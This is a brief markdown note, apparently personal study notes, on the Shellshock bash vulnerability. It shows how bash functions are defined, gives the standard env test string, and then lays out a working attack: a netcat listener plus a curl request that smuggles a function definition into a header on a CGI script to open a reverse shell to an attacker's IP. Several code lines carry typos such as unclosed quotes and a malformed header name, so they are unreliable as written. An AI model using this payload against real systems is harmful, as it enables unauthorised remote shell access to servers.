# Shellshock

### Bash functions

Can be defined in "one liners"


```
$ welcome() {echo "Hi $User}
```

```
$ welcome
```

> Hi user

Can be defined in environment variables



```
$export hellofunc="() {echo "Hi $User}"

```

```
$bash -c 'hellofunc'
```

### Shellshock

> env val='() { :;}; echo vulnerable' bash -c "echo test"


### Exploit Shellshock to gain a Shell

#### Attacker machine


> netcat -nlvp 443




#### use curl send a request



> curl -H "user agent: () {:;};echo;/bin/nc -e /bin/bash [yourIPaddress] 443" [targetIPaddress]/cgi-bin/vulnerable.cgi
 





